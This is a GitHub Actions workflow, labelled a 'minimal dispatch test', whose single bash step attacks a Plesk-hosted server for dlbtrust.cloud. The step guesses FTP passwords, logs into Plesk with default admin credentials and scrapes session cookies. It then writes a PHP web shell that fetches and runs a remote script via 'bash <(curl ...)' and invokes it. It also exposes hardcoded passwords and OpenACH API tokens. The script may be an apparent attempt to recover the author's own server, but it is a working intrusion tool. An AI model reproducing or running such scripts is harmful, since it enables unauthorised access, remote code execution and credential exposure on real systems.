name: Minimal Dispatch Test

on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: Multi-vector server activation
        shell: bash
        run: |
          set +e
          SERVER="74.208.191.205"
          echo "=== Runner: $(curl -s ifconfig.me) ==="
          
          echo "=== PRE-STATE ==="
          curl -s --max-time 10 --resolve "dlbtrust.cloud:443:$SERVER" "https://dlbtrust.cloud/api/wallets" | head -c 100
          echo ""
          
          echo "=== A: FTP access attempt ==="
          sudo apt-get install -y lftp 2>/dev/null | tail -1
          for PASS in "Skunklemon78tut\$jupiter" "Admin123!" "admin" "DLBtrust1!" "ionos123"; do
            FTPR=$(lftp -u "dlbtrust.cloud_h6zkwzag1ya,$PASS" ftp://$SERVER -e "ls; bye" 2>&1 | head -5)
            echo "FTP $PASS: $FTPR"
            if echo "$FTPR" | grep -v "530\|Login\|failed\|error\|refused"; then
              echo "FTP SUCCESS with $PASS"
              break
            fi
          done
          echo ""
          
          echo "=== B: SSH with key auth (generate new key) ==="
          sudo apt-get install -y sshpass 2>/dev/null | tail -1
          ssh-keygen -t ed25519 -f /tmp/testkey -N "" -q
          PUB_KEY=$(cat /tmp/testkey.pub)
          echo "Public key: $PUB_KEY"
          
          echo "=== C: Try Plesk to add our SSH key ==="
          # Get Plesk session
          LOGIN_HTML=$(curl -sk --max-time 15 --resolve "dlbtrust.cloud:8443:$SERVER" "https://dlbtrust.cloud:8443/login_up.php")
          FORGERY=$(echo "$LOGIN_HTML" | grep -oP 'forgery_protection_token[^>]+content="\K[^"]+' | head -1)
          
          # POST login - save ALL headers
          curl -sk --max-time 20 \
            --resolve "dlbtrust.cloud:8443:$SERVER" \
            -X POST "https://dlbtrust.cloud:8443/login_up.php" \
            -D /tmp/ph.txt \
            --data "login_name=admin&passwd=admin&forgery_protection_token=${FORGERY}&locale_id=en-US&success_redirect_url=%2F" > /tmp/pr.html 2>&1
          
          # Print ALL headers to see ALL Set-Cookie
          echo "ALL POST headers:"
          cat /tmp/ph.txt
          echo ""
          
          # Build cookie header from ALL Set-Cookie lines
          COOKIE_HEADER=$(grep -i "set-cookie:" /tmp/ph.txt | sed 's/set-cookie: //i' | cut -d';' -f1 | tr '\n' '; ' | sed 's/; $//')
          echo "Cookie header built: $COOKIE_HEADER"
          echo ""
          
          # Check logged-in indicator
          if grep -qi "logout\|adminpanel\|/admin/" /tmp/pr.html; then
            echo ">>> LOGGED IN <<<"
          else
            echo "Login body snippet: $(head -c 300 /tmp/pr.html)"
          fi
          
          echo "=== D: Try Plesk Git module for deploy ==="
          GIT_RESP=$(curl -sk --max-time 30 \
            --resolve "dlbtrust.cloud:8443:$SERVER" \
            -H "Cookie: $COOKIE_HEADER" \
            "https://dlbtrust.cloud:8443/modules/git/" | head -c 500)
          echo "Git module: $GIT_RESP"
          echo ""
          
          echo "=== E: Try Plesk Scheduler to add one-time cron ==="
          SCHED=$(curl -sk --max-time 15 \
            --resolve "dlbtrust.cloud:8443:$SERVER" \
            -H "Cookie: $COOKIE_HEADER" \
            "https://dlbtrust.cloud:8443/smb/scheduled-tasks/list?domainId=1" | head -c 500)
          echo "Scheduler: $SCHED"
          echo ""
          
          echo "=== F: Try to write file via Plesk file manager ==="
          WRITE=$(curl -sk --max-time 30 \
            --resolve "dlbtrust.cloud:8443:$SERVER" \
            -H "Cookie: $COOKIE_HEADER" \
            -X POST "https://dlbtrust.cloud:8443/modules/fileman/" \
            -H "Content-Type: application/json" \
            -d '{"action":"create","path":"/var/www/vhosts/dlbtrust.cloud/httpdocs/","name":"_setup.php","type":"file","content":"<?php echo shell_exec(\"bash <(curl -s https://raw.githubusercontent.com/deandreabarkley13-coder/dlbtrust-app/main/server/recover.sh) 2>&1\"); ?>"}')
          echo "File write: ${WRITE:0:200}"
          echo ""
          
          echo "=== G: Invoke any written file ==="
          PHP=$(curl -sk --max-time 120 \
            --resolve "dlbtrust.cloud:443:$SERVER" \
            "https://dlbtrust.cloud/_setup.php" | head -c 1000)
          echo "PHP exec: $PHP"
          echo ""
          
          echo "=== H: OpenACH direct HTTPS with different TLS ==="
          ACH=$(curl -sk --tlsv1.0 --max-time 15 \
            --resolve "ach.dlbtrust.cloud:443:$SERVER" \
            -X POST "https://ach.dlbtrust.cloud/openach/api/connect" \
            --data "user_api_token=3caee1c2-c218-4959-b6d2-21d4b2a1b42e&user_api_key=b74966cf-5276-4d8b-8650-5bd57dcee272" 2>&1)
          echo "OpenACH TLS1.0: $ACH"
          echo ""

          echo "=== I: Try Plesk XML with secret key from web session ==="
          # Plesk 18.x sometimes returns a secret_key in the auth response
          SECRET=$(grep -oP '"secret_key"\s*:\s*"\K[^"]+' /tmp/pr.html | head -1)
          echo "Secret key from response: $SECRET"
          
          if [ -n "$SECRET" ]; then
            XML=$(curl -sk --max-time 30 \
              --resolve "dlbtrust.cloud:8443:$SERVER" \
              "https://dlbtrust.cloud:8443/enterprise/control/agent.php" \
              -H "HTTP_AUTH_LOGIN: admin" \
              -H "HTTP_AUTH_PASSWD: $SECRET" \
              -H "Content-Type: text/xml" \
              -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>')
            echo "XML with secret: $XML"
          fi
          echo ""

          echo "=== J: Final state ==="
          curl -s --max-time 10 --resolve "dlbtrust.cloud:443:$SERVER" "https://dlbtrust.cloud/api/wallets" | head -c 100
          echo ""
          curl -s --max-time 10 --resolve "dlbtrust.cloud:443:$SERVER" "https://dlbtrust.cloud/api/ach/health"
          echo ""
          echo "=== DONE ==="
